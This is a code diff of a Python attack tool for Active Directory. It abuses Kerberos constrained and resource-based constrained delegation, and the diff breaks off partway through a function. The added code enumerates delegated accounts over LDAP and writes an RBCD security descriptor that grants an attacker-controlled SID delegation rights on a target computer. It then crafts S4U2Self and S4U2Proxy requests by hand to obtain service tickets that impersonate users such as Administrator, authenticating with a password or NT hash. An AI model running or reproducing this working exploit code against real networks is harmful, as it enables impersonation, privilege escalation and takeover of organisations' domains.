@@ -1,68 +1,679 @@
 #!/usr/bin/env python3
 
-
 import sys
 import os
 import re
-import glob
-import subprocess
-import shutil
-import types
+import signal
+import datetime
+import struct
+import time
 import getpass
+import random
 
-# ── impacket imports ──────────────────────────────────────────────────────────
-try:
-    from impacket.krb5 import constants
-    from impacket.krb5.kerberosv5 import getKerberosTGT
-    from impacket.krb5.types import Principal
-    from impacket.ldap import ldap, ldapasn1
-    from impacket.ldap import ldaptypes
-    from impacket.smbconnection import SMBConnection
-except ImportError as e:
-    print(f"[!] Missing dependency: {e}")
-    print("    Run: pip3 install impacket")
-    sys.exit(1)
+from colorama import Fore, Style, init
 
+from impacket.krb5 import constants
+from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
+from impacket.krb5.types import Principal, KerberosTime, Ticket
+from impacket.krb5.ccache import CCache
+from impacket.krb5.crypto import _HMACMD5
+from impacket.krb5.asn1 import (
+    AS_REP, TGS_REQ, TGS_REP, Ticket as TicketAsn1,
+    AP_REQ, Authenticator,
+    seq_set, seq_set_iter,
+    PA_FOR_USER_ENC, PA_PAC_OPTIONS
+)
+from impacket.ldap import ldap, ldapasn1
+from impacket.ldap import ldaptypes
+from impacket.smbconnection import SMBConnection
+from impacket.dcerpc.v5.dcom import wmi as wmi_mod
+from impacket.dcerpc.v5.dcomrt import DCOMConnection
+from impacket.dcerpc.v5.dtypes import NULL
 
-# ── colors ────────────────────────────────────────────────────────────────────
-R  = "\033[91m"
-G  = "\033[92m"
-Y  = "\033[93m"
-B  = "\033[94m"
-M  = "\033[95m"
-C  = "\033[96m"
-W  = "\033[97m"
-BO = "\033[1m"
-RS = "\033[0m"
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+from six import ensure_binary
 
-BANNER = f"""
-{M}{BO}╔══════════════════════════════════════════════╗
-║         S 4 U 2 S E L F  +  S 4 U 2 P R O X Y       ║
-║         Constrained Delegation & RBCD Abuse         ║
-╚═════════════════════════════════════════════════════╝{RS}
-"""
 
 # ─────────────────────────────────────────────────────────────────────────────
-# STEP 1 — Get TGT for the service account we compromised
+# INIT
+# ─────────────────────────────────────────────────────────────────────────────
+init(autoreset=True)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SIGNAL HANDLER
+# ─────────────────────────────────────────────────────────────────────────────
+def _exit_handler(sig, frame):
+    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, _exit_handler)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# BANNER
+# ─────────────────────────────────────────────────────────────────────────────
+def banner():
+    print(Fore.CYAN + """
+    ╔══════════════════════════════════════════════════════════════╗
+    ║      S4U2Self + S4U2Proxy Attack Tool                        ║
+    ║  Constrained Delegation & RBCD Abuse via Kerberos            ║
+    ╚══════════════════════════════════════════════════════════════╝
+    """ + Style.RESET_ALL)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# VALIDATORS
+# ─────────────────────────────────────────────────────────────────────────────
+def validate_ip(ip):
+    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
+    if not re.match(pattern, ip):
+        return False
+    return all(0 <= int(p) <= 255 for p in ip.split('.'))
+
+
+def validate_domain(domain):
+    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
+    if not re.match(pattern, domain):
+        return False
+    for part in domain.split('.'):
+        if part.startswith('-') or part.endswith('-') or not part:
+            return False
+    return True
+
+
+def validate_password(password):
+    return len(password) >= 1
+
+
+def validate_hash(hash_str):
+    if ':' in hash_str:
+        parts = hash_str.split(':')
+        if len(parts) == 2:
+            lm, nt = parts
+            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
+        return False
+    else:
+        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)
+
+
+def validate_sid(sid_str):
+    pattern = r'^S-1-5-21-\d+-\d+-\d+-\d+$'
+    return bool(re.match(pattern, sid_str))
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# INPUT HELPER
+# ─────────────────────────────────────────────────────────────────────────────
+def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default="", secret=False):
+    while True:
+        try:
+            if secret:
+                import re as _re
+                clean_prompt = _re.sub(r'\033\[[0-9;]*m', '', prompt)
+                value = getpass.getpass(clean_prompt).strip()
+            else:
+                value = input(prompt).strip()
+            if not value and not allow_empty:
+                if default:
+                    return default
+                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
+                continue
+            if not value and allow_empty:
+                return default
+            if validator and value and not validator(value):
+                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
+                continue
+            return value
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+            sys.exit(0)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# UTILITY FUNCTIONS
+# ─────────────────────────────────────────────────────────────────────────────
+def get_base_dn(domain):
+    return ','.join([f"DC={part}" for part in domain.split('.')])
+
+
+def check_ip_reachable(ip):
+    import socket
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        result = sock.connect_ex((ip, 88))
+        sock.close()
+        if result == 0:
+            return True
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        result = sock.connect_ex((ip, 445))
+        sock.close()
+        return result == 0
+    except Exception:
+        return False
+
+
+def check_credentials_and_domain(dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
+    if auth_type == 'password':
+        try:
+            base_dn = get_base_dn(domain)
+            from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
+            import ssl
+            tls = Tls(validate=ssl.CERT_NONE)
+            server = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
+            conn = Connection(
+                server,
+                user=f"{domain}\\{username}",
+                password=password,
+                authentication=NTLM,
+                auto_bind=True
+            )
+            conn.search(
+                search_base=base_dn,
+                search_filter='(objectClass=domain)',
+                search_scope=SUBTREE,
+                attributes=['dc']
+            )
+            result = len(conn.entries) > 0
+            conn.unbind()
+            return result
+        except Exception:
+            try:
+                base_dn = get_base_dn(domain)
+                server = Server(dc_ip, get_info=ALL, connect_timeout=5)
+                conn = Connection(
+                    server,
+                    user=f"{domain}\\{username}",
+                    password=password,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+                conn.search(
+                    search_base=base_dn,
+                    search_filter='(objectClass=domain)',
+                    search_scope=SUBTREE,
+                    attributes=['dc']
+                )
+                result = len(conn.entries) > 0
+                conn.unbind()
+                return result
+            except Exception:
+                return False
+    else:
+        try:
+            from impacket.dcerpc.v5 import transport, samr
+            string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
+            tr = transport.DCERPCTransportFactory(string_binding)
+
+            if auth_type == 'hash':
+                tr.set_credentials(username, '', domain, lmhash, nthash)
+            elif auth_type == 'ticket':
+                tr.set_credentials(username, '', domain, '', '')
+                tr.set_kerberos(True, kdcHost=dc_ip)
+                if ticket_file and os.path.exists(ticket_file):
+                    os.environ['KRB5CCNAME'] = ticket_file
+
+            dce = tr.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+
+            resp = samr.hSamrConnect(dce)
+            server_hd = resp['ServerHandle']
+
+            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
+
+            samr.hSamrCloseHandle(dce, server_hd)
+            dce.disconnect()
+            return True
+        except Exception as e:
+            err = str(e).lower()
+            if any(x in err for x in ['logon failure', 'access_denied', 'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
+                return "invalid_credentials"
+            return False
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# LDAP ENUMERATION
+# ─────────────────────────────────────────────────────────────────────────────
+def ldap_enum_delegation(dc_ip, domain, username, password, nt_hash=""):
+    base_dn = get_base_dn(domain)
+    print(Fore.BLUE + f"[*] Connecting to LDAP {dc_ip} for delegation recon..." + Style.RESET_ALL)
+
+    try:
+        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
+        if nt_hash:
+            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
+        else:
+            conn.login(username, password, domain)
+        print(Fore.GREEN + f"[+] Authenticated as {username}@{domain}" + Style.RESET_ALL)
+    except Exception as e:
+        print(Fore.RED + f"[-] LDAP failed: {e}" + Style.RESET_ALL)
+        return None
+
+    results = {"unconstrained": [], "constrained": [], "rbcd": []}
+
+    # 1. Unconstrained Delegation
+    print(Fore.BLUE + "[*] Searching unconstrained delegation (flag 0x80000)..." + Style.RESET_ALL)
+    try:
+        resp = conn.search(
+            searchFilter=(
+                "(&"
+                "(|(objectClass=user)(objectClass=computer))"
+                "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
+                ")"
+            ),
+            attributes=["sAMAccountName", "objectClass", "userAccountControl"]
+        )
+        for item in resp:
+            if not isinstance(item, ldapasn1.SearchResultEntry):
+                continue
+            sam = ""
+            for attr in item['attributes']:
+                if str(attr['type']) == "sAMAccountName":
+                    sam = str(attr['vals'][0])
+            if sam:
+                results["unconstrained"].append(sam)
+    except Exception as e:
+        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)
+
+    # 2. Constrained Delegation
+    print(Fore.BLUE + "[*] Searching constrained delegation (msDS-AllowedToDelegateTo)..." + Style.RESET_ALL)
+    try:
+        resp = conn.search(
+            searchFilter=(
+                "(&"
+                "(|(objectClass=user)(objectClass=computer))"
+                "(msDS-AllowedToDelegateTo=*)"
+                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
+                ")"
+            ),
+            attributes=["sAMAccountName", "msDS-AllowedToDelegateTo", "userAccountControl"]
+        )
+        for item in resp:
+            if not isinstance(item, ldapasn1.SearchResultEntry):
+                continue
+            sam, spns, uac = "", [], 0
+            for attr in item['attributes']:
+                name = str(attr['type'])
+                vals = [str(v) for v in attr['vals']]
+                if name == "sAMAccountName":
+                    sam = vals[0]
+                elif name == "msDS-AllowedToDelegateTo":
+                    spns = vals
+                elif name == "userAccountControl":
+                    uac = int(vals[0])
+            if sam and spns:
+                t2a4d = bool(uac & 16777216)
+                results["constrained"].append({"account": sam, "spns": spns, "t2a4d": t2a4d})
+    except Exception as e:
+        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)
+
+    # 3. RBCD
+    print(Fore.BLUE + "[*] Searching RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)..." + Style.RESET_ALL)
+    try:
+        resp = conn.search(
+            searchFilter=(
+                "(&"
+                "(objectClass=computer)"
+                "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
+                ")"
+            ),
+            attributes=["sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"]
+        )
+        for item in resp:
+            if not isinstance(item, ldapasn1.SearchResultEntry):
+                continue
+            sam = ""
+            for attr in item['attributes']:
+                if str(attr['type']) == "sAMAccountName":
+                    sam = str(attr['vals'][0])
+            if sam:
+                results["rbcd"].append(sam)
+    except Exception as e:
+        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)
+
+    conn.close()
+
+    # Print results
+    print(Fore.GREEN + "\n" + "=" * 52 + " DELEGATION ENUMERATION RESULTS " + "=" * 4 + Style.RESET_ALL + "\n")
+
+    print(Fore.YELLOW + "[1] UNCONSTRAINED DELEGATION (most dangerous — gets full TGT)" + Style.RESET_ALL)
+    if results["unconstrained"]:
+        for acc in results["unconstrained"]:
+            print(Fore.RED + f"    ⚠  {acc}" + Style.RESET_ALL)
+    else:
+        print(Fore.GREEN + "    None found" + Style.RESET_ALL)
+
+    print(Fore.YELLOW + "\n[2] CONSTRAINED DELEGATION (can delegate to specific SPNs only)" + Style.RESET_ALL)
+    if results["constrained"]:
+        for entry in results["constrained"]:
+            t2a4d_flag = Fore.GREEN + "T2A4D=YES" + Style.RESET_ALL if entry['t2a4d'] else Fore.RED + "T2A4D=NO" + Style.RESET_ALL
+            print(Fore.CYAN + f"    {entry['account']:<30} [{t2a4d_flag}]" + Style.RESET_ALL)
+            for spn in entry['spns']:
+                print(Fore.BLUE + f"      -> {spn}" + Style.RESET_ALL)
+    else:
+        print(Fore.GREEN + "    None found" + Style.RESET_ALL)
+
+    print(Fore.YELLOW + "\n[3] RESOURCE-BASED CONSTRAINED DELEGATION (RBCD — set on target machine)" + Style.RESET_ALL)
+    if results["rbcd"]:
+        for acc in results["rbcd"]:
+            print(Fore.CYAN + f"    {acc}" + Style.RESET_ALL)
+    else:
+        print(Fore.GREEN + "    None found" + Style.RESET_ALL)
+
+    return results
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# RBCD SETUP
+# ─────────────────────────────────────────────────────────────────────────────
+def rbcd_setup(dc_ip, domain, username, password, target_computer, attacker_account_sid, nt_hash=""):
+    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
+    print(Fore.CYAN + "  RBCD SETUP — Writing delegation attribute" + Style.RESET_ALL)
+    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Target computer:      {target_computer}" + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Attacker account SID: {attacker_account_sid}" + Style.RESET_ALL)
+    print(Fore.YELLOW + "\n    We're writing a Security Descriptor to:" + Style.RESET_ALL)
+    print(Fore.YELLOW + f"    {target_computer}$ -> msDS-AllowedToActOnBehalfOfOtherIdentity" + Style.RESET_ALL)
+    print(Fore.YELLOW + f"    This grants our account the right to use S4U2Proxy" + Style.RESET_ALL)
+    print(Fore.YELLOW + f"    against {target_computer} as ANY user." + Style.RESET_ALL)
+
+    base_dn = get_base_dn(domain)
+    try:
+        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
+        if nt_hash:
+            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
+        else:
+            conn.login(username, password, domain)
+        print(Fore.GREEN + "[+] LDAP authenticated" + Style.RESET_ALL)
+    except Exception as e:
+        print(Fore.RED + f"[-] LDAP failed: {e}" + Style.RESET_ALL)
+        return False
+
+    try:
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+        sd['Revision'] = b'\x01'
+        sd['Sbz1'] = b'\x00'
+        sd['Control'] = b'\x04\x80'
+        sd['OwnerSid'] = ldaptypes.LDAP_SID()
+        sd['GroupSid'] = ldaptypes.LDAP_SID()
+
+        acl = ldaptypes.ACL()
+        acl['AclRevision'] = 2
+        acl['Sbz1'] = 0
+        acl['Sbz2'] = 0
+
+        ace = ldaptypes.ACCESS_ALLOWED_ACE()
+        ace['Mask'] = ldaptypes.ACCESS_MASK()
+        ace['Mask']['Mask'] = 0xf01ff
+        ace['Flags'] = 0
+
+        ace_sid = ldaptypes.LDAP_SID()
+        ace_sid.fromCanonical(attacker_account_sid)
+        ace['Sid'] = ace_sid
+
+        acl['Data'] = ace.getData()
+        sd['Dacl'] = acl
+
+        resp = conn.search(
+            searchFilter=f"(sAMAccountName={target_computer}$)",
+            attributes=["distinguishedName"]
+        )
+        target_dn = None
+        for item in resp:
+            if not isinstance(item, ldapasn1.SearchResultEntry):
+                continue
+            for attr in item['attributes']:
+                if str(attr['type']) == "distinguishedName":
+                    target_dn = str(attr['vals'][0])
+
+        if not target_dn:
+            print(Fore.RED + f"[-] Computer {target_computer} not found in LDAP" + Style.RESET_ALL)
+            return False
+
+        print(Fore.BLUE + f"  Target DN: {target_dn}" + Style.RESET_ALL)
+
+        conn.modifyObject(
+            target_dn,
+            {
+                'msDS-AllowedToActOnBehalfOfOtherIdentity': (
+                    ldap.MODIFY_REPLACE, [sd.getData()]
+                )
+            }
+        )
+        print(Fore.GREEN + "[+] RBCD attribute written successfully!" + Style.RESET_ALL)
+        print(Fore.GREEN + f"[+] {target_computer} now trusts our account for delegation." + Style.RESET_ALL)
+        conn.close()
+        return True
+
+    except Exception as e:
+        print(Fore.RED + f"[-] Failed to write attribute: {e}" + Style.RESET_ALL)
+        print(Fore.YELLOW + f"[!] Check that you have GenericWrite/WriteDacl on {target_computer}$" + Style.RESET_ALL)
+        conn.close()
+        return False
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MANUAL S4U2Self
+# ─────────────────────────────────────────────────────────────────────────────
+def manual_s4u2self(username, domain, dc_ip, impersonate_user, tgt, cipher, session_key):
+    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
+    print(Fore.CYAN + "  STEP 2 — S4U2Self (Manual)" + Style.RESET_ALL)
+    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Impersonating:  {impersonate_user}" + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Service (us):   {username}@{domain.upper()}" + Style.RESET_ALL)
+    print(Fore.YELLOW + f"\n    Building PA-FOR-USER structure..." + Style.RESET_ALL)
+
+    try:
+        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+        ticket = Ticket()
+        ticket.from_asn1(decoded_tgt['ticket'])
+
+        # Build AP-REQ
+        authenticator = Authenticator()
+        authenticator['authenticator-vno'] = 5
+        authenticator['crealm'] = str(decoded_tgt['crealm'])
+        client_name = Principal()
+        client_name.from_asn1(decoded_tgt, 'crealm', 'cname')
+        seq_set(authenticator, 'cname', client_name.components_to_asn1)
+        now = datetime.datetime.now(datetime.timezone.utc)
+        authenticator['cusec'] = now.microsecond
+        authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+        enc_auth = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)
+
+        ap_req = AP_REQ()
+        ap_req['pvno'] = 5
+        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+        ap_req['ap-options'] = constants.encodeFlags([])
+        seq_set(ap_req, 'ticket', ticket.to_asn1)
+        ap_req['authenticator'] = noValue
+        ap_req['authenticator']['etype'] = cipher.enctype
+        ap_req['authenticator']['cipher'] = enc_auth
+        ap_req_encoded = encoder.encode(ap_req)
+
+        # Build PA-FOR-USER
+        client_name = Principal(impersonate_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        s4u_data = (
+            struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
+            + ensure_binary(impersonate_user)
+            + ensure_binary(domain)
+            + b'Kerberos'
+        )
+        checksum = _HMACMD5.checksum(session_key, 17, s4u_data)
+
+        pa_for_user = PA_FOR_USER_ENC()
+        seq_set(pa_for_user, 'userName', client_name.components_to_asn1)
+        pa_for_user['userRealm'] = domain
+        pa_for_user['cksum'] = noValue
+        pa_for_user['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
+        pa_for_user['cksum']['checksum'] = checksum
+        pa_for_user['auth-package'] = 'Kerberos'
+
+        # Build TGS-REQ
+        tgs_req = TGS_REQ()
+        tgs_req['pvno'] = 5
+        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+        tgs_req['padata'] = noValue
+        tgs_req['padata'][0] = noValue
+        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
+        tgs_req['padata'][1] = noValue
+        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
+        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_for_user)
+
+        req_body = seq_set(tgs_req, 'req-body')
+        opts = [
+            constants.KDCOptions.forwardable.value,
+            constants.KDCOptions.renewable.value,
+            constants.KDCOptions.canonicalize.value,
+        ]
+        req_body['kdc-options'] = constants.encodeFlags(opts)
+
+        server_name = Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+        seq_set(req_body, 'sname', server_name.components_to_asn1)
+        req_body['realm'] = str(decoded_tgt['crealm'])
+        req_body['till'] = KerberosTime.to_asn1(
+            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+        )
+        req_body['nonce'] = random.getrandbits(31)
+        seq_set_iter(req_body, 'etype', (
+            int(cipher.enctype),
+            int(constants.EncryptionTypes.rc4_hmac.value),
+        ))
+
+        print(Fore.BLUE + "[*] Sending S4U2Self request to KDC..." + Style.RESET_ALL)
+        tgs_self_raw = sendReceive(encoder.encode(tgs_req), domain, dc_ip)
+
+        print(Fore.GREEN + "[+] S4U2Self SUCCESS!" + Style.RESET_ALL)
+        print(Fore.GREEN + f"  Got ticket: {impersonate_user} -> {username}" + Style.RESET_ALL)
+        print(Fore.YELLOW + f"  This ticket proves '{impersonate_user} authenticated to us'" + Style.RESET_ALL)
+        return tgs_self_raw
+
+    except Exception as e:
+        print(Fore.RED + f"[-] S4U2Self failed: {e}" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  Hint: Account may not have TrustedToAuthForDelegation set." + Style.RESET_ALL)
+        print(Fore.YELLOW + "  For RBCD mode this is OK — forwardable not required." + Style.RESET_ALL)
+        return None
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MANUAL S4U2Proxy
+# ─────────────────────────────────────────────────────────────────────────────
+def manual_s4u2proxy(username, domain, dc_ip, target_spn, impersonate_user, tgs_self_raw, tgt, cipher, session_key):
+    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
+    print(Fore.CYAN + "  STEP 3 — S4U2Proxy (Manual)" + Style.RESET_ALL)
+    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Target SPN:     {target_spn}" + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Impersonating:  {impersonate_user}" + Style.RESET_ALL)
+    print(Fore.YELLOW + f"\n    Building S4U2Proxy request..." + Style.RESET_ALL)
+
+    try:
+        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+        ticket = Ticket()
+        ticket.from_asn1(decoded_tgt['ticket'])
+
+        # Build AP-REQ
+        authenticator = Authenticator()
+        authenticator['authenticator-vno'] = 5
+        authenticator['crealm'] = str(decoded_tgt['crealm'])
+        client_name = Principal()
+        client_name.from_asn1(decoded_tgt, 'crealm', 'cname')
+        seq_set(authenticator, 'cname', client_name.components_to_asn1)
+        now = datetime.datetime.now(datetime.timezone.utc)
+        authenticator['cusec'] = now.microsecond
+        authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+        enc_auth = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)
+
+        ap_req = AP_REQ()
+        ap_req['pvno'] = 5
+        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+        ap_req['ap-options'] = constants.encodeFlags([])
+        seq_set(ap_req, 'ticket', ticket.to_asn1)
+        ap_req['authenticator'] = noValue
+        ap_req['authenticator']['etype'] = cipher.enctype
+        ap_req['authenticator']['cipher'] = enc_auth
+        ap_req_encoded = encoder.encode(ap_req)
+
+        # Decode S4U2Self ticket
+        decoded_self = decoder.decode(tgs_self_raw, asn1Spec=TGS_REP())[0]
+        ticket_self = Ticket()
+        ticket_self.from_asn1(decoded_self['ticket'])
+
+        # PA-PAC-OPTIONS
+        pa_pac_options = PA_PAC_OPTIONS()
+        pa_pac_options['flags'] = constants.encodeFlags(
+            (constants.PAPacOptions.resource_based_constrained_delegation.value,)
+        )
+
+        # Build TGS-REQ
+        tgs_req = TGS_REQ()
+        tgs_req['pvno'] = 5
+        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+        tgs_req['padata'] = noValue
+        tgs_req['padata'][0] = noValue
+        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
+        tgs_req['padata'][1] = noValue
+        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value)
+        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_pac_options)
+
+        req_body = seq_set(tgs_req, 'req-body')
+        opts = [
+            constants.KDCOptions.cname_in_addl_tkt.value,
+            constants.KDCOptions.canonicalize.value,
+            constants.KDCOptions.forwardable.value,
+            constants.KDCOptions.renewable.value,
+        ]
+        req_body['kdc-options'] = constants.encodeFlags(opts)
+
+        service_name = Principal(target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        seq_set(req_body, 'sname', service_name.components_to_asn1)
+        req_body['realm'] = domain
+        req_body['till'] = KerberosTime.to_asn1(
+            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+        )
+        req_body['nonce'] = random.getrandbits(31)
+        seq_set_iter(req_body, 'etype', (
+            int(constants.EncryptionTypes.rc4_hmac.value),
+            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
+            int(constants.EncryptionTypes.des_cbc_md5.value),
+            int(cipher.enctype),
+        ))
+        my_ticket = ticket_self.to_asn1(TicketAsn1())
+        seq_set_iter(req_body, 'additional-tickets', (my_ticket,))
+
+        print(Fore.BLUE + f"[*] Sending S4U2Proxy request for SPN: {target_spn}" + Style.RESET_ALL)
+        tgs_proxy_raw = sendReceive(encoder.encode(tgs_req), domain, dc_ip)
+
+        print(Fore.GREEN + "[+] S4U2Proxy SUCCESS!" + Style.RESET_ALL)
+        print(Fore.GREEN + f"  Got ticket: {impersonate_user} -> {target_spn}" + Style.RESET_ALL)
+        print(Fore.GREEN + "  We now hold a valid Kerberos ticket as Administrator!" + Style.RESET_ALL)
+        return tgs_proxy_raw
+
+    except Exception as e:
+        print(Fore.RED + f"[-] S4U2Proxy failed: {e}" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  Common reasons:" + Style.RESET_ALL)
+        print(Fore.YELLOW + "    - Account not trusted for delegation to this SPN" + Style.RESET_ALL)
+        print(Fore.YELLOW + "    - S4U2Self ticket was not forwardable (classic CD)" + Style.RESET_ALL)
+        print(Fore.YELLOW + "    - RBCD attribute not set on target computer" + Style.RESET_ALL)
+        return None
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# GET TGT
 # ─────────────────────────────────────────────────────────────────────────────
 def get_tgt(username, domain, dc_ip, password="", nt_hash=""):
-    """
-    Authenticate to the KDC and get a TGT for our service account.
-
-    WHY: S4U extensions require the requesting service to hold a valid TGT.
-         The KDC will only honor S4U requests from authenticated services.
-
-    WHAT HAPPENS INSIDE:
-      1. We send an AS-REQ with our credentials (PA-ENC-TIMESTAMP pre-auth)
-      2. KDC verifies our password/hash
-      3. KDC returns AS-REP containing our TGT encrypted with krbtgt's key
-      4. We decrypt the session key using our password/hash
-    """
-    print(f"\n{B}{'─'*55}")
-    print(f"  STEP 1 — Get TGT for service account: {username}")
-    print(f"{'─'*55}{RS}")
-    print(f"  {C}Sending AS-REQ to KDC {dc_ip}...{RS}")
-    print(f"  {C}  → Pre-auth: {'NT Hash (RC4)' if nt_hash else 'Password'}{RS}")
+    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
+    print(Fore.CYAN + f"  STEP 1 — Get TGT for service account: {username}" + Style.RESET_ALL)
+    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
+    print(Fore.BLUE + f"  Sending AS-REQ to KDC {dc_ip}..." + Style.RESET_ALL)
+    print(Fore.BLUE + f"  -> Pre-auth: {'NT Hash (RC4)' if nt_hash else 'Password'}" + Style.RESET_ALL)
 
     user_principal = Principal(
         username,
@@ -71,10 +682,9 @@ def get_tgt(username, domain, dc_ip, password="", nt_hash=""):
 
     try:
         if nt_hash:
-            # Normalise hash: strip colons/spaces, validate length
             nt_clean = nt_hash.replace(":", "").replace(" ", "").lower()
             if len(nt_clean) != 32:
-                print(f"  {R}[!] NT hash must be 32 hex chars (got {len(nt_clean)}){RS}")
+                print(Fore.RED + f"[!] NT hash must be 32 hex chars (got {len(nt_clean)})" + Style.RESET_ALL)
                 sys.exit(1)
             lm = "aad3b435b51404eeaad3b435b51404ee"
             tgt, cipher, old_sk, sk = getKerberosTGT(
@@ -97,565 +707,67 @@ def get_tgt(username, domain, dc_ip, password="", nt_hash=""):
                 kdcHost=dc_ip
             )
 
-        print(f"  {G}[+] TGT received!{RS}")
-        print(f"  {G}    KDC confirmed identity of {username}@{domain.upper()}{RS}")
-        print(f"  {Y}    TGT is our 'service identity token' for S4U requests{RS}")
+        print(Fore.GREEN + "[+] TGT received!" + Style.RESET_ALL)
+        print(Fore.GREEN + f"  KDC confirmed identity of {username}@{domain.upper()}" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  TGT is our 'service identity token' for S4U requests" + Style.RESET_ALL)
         return tgt, cipher, old_sk, sk
 
     except Exception as e:
-        print(f"  {R}[!] TGT failed: {e}{RS}")
+        print(Fore.RED + f"[-] TGT failed: {e}" + Style.RESET_ALL)
         sys.exit(1)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# STEP 2 — S4U2Self: get a ticket to ourselves impersonating the target user
+# SAVE TICKET
 # ─────────────────────────────────────────────────────────────────────────────
-def s4u2self(username, domain, dc_ip, impersonate_user, tgt, cipher, old_sk, sk):
-    """
-    S4U2Self: request a service ticket for 'impersonate_user' → 'username' (us).
+def save_ticket(tgs, domain, target_spn, impersonate_user):
+    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
+    print(Fore.CYAN + "  STEP 4 — Save ticket to .ccache" + Style.RESET_ALL)
+    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
 
-    WHY THIS WORKS:
-      The KDC allows a service to request tickets for arbitrary users
